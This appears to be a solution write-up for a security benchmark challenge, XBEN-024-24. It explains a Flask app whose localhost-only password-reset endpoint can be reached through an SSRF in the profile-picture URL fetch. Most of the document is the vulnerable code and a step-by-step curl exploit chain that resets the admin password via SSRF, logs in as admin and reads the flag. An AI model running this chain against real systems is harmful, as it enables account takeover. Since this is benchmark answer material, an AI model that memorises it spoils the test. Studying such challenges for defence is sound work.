# XBEN-024-24 — Profile Picture

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vuln class:** Server-Side Request Forgery (SSRF) used to bypass an IP-based access control (`127.0.0.1`-only admin password-reset endpoint).

## Root cause

`app/app.py`:

```python
@app.route('/reset_password', methods=['GET'])
def reset_password():
    if request.remote_addr != '127.0.0.1':
        return "Unauthorized", 403
    username = request.args.get('username')
    new_password = request.args.get('newpassword')
    if username in users:
        users[username]['password'] = new_password
        return "Password reset successfully", 200
```

`/reset_password` only checks `request.remote_addr`, trusting any caller whose source IP is `127.0.0.1`. The `/profile` POST handler contains an SSRF primitive:

```python
profile_picture_url = request.form.get('profile_picture_url')
if profile_picture_url:
    filename = secure_filename(profile_picture_url.split('/')[-1])
    urllib.request.urlretrieve(profile_picture_url, os.path.join(app.config['UPLOAD_FOLDER'], filename))
```

The Flask server itself fetches any attacker-supplied URL. Pointing `profile_picture_url` at `http://127.0.0.1/reset_password?username=admin&newpassword=...` makes the request originate from the app's own loopback interface, satisfying the `127.0.0.1` check and resetting the admin password. We can then log in as `admin` and read the flag, which is only shown on `/profile` when `session['username'] == 'admin'`.

## Exploit

```bash
PORT=<PORT>          # from docker compose port, e.g. 62250
BASE=http://localhost:$PORT
COOKIES=/tmp/xben024_cookies.txt

# 1. Register a throwaway account (no admin creds needed)
curl -s -c $COOKIES -b $COOKIES -X POST $BASE/register \
  -d "username=attacker&password=pass123&first_name=A&last_name=B&email=a@b.com"

# 2. Log in as that account
curl -s -c $COOKIES -b $COOKIES -X POST $BASE/login -d "username=attacker&password=pass123"

# 3. SSRF: make the server itself call the localhost-only /reset_password endpoint
curl -s -c $COOKIES -b $COOKIES -X POST $BASE/profile \
  -d "first_name=A&last_name=B&email=a@b.com&profile_picture_url=http://127.0.0.1:80/reset_password%3Fusername=admin%26newpassword=hacked123"

# 4. Log in as admin with the password we just set via SSRF
curl -s -c $COOKIES -b $COOKIES -X POST $BASE/login -d "username=admin&password=hacked123"

# 5. Read the flag from the admin profile page
curl -s -c $COOKIES -b $COOKIES $BASE/profile
```
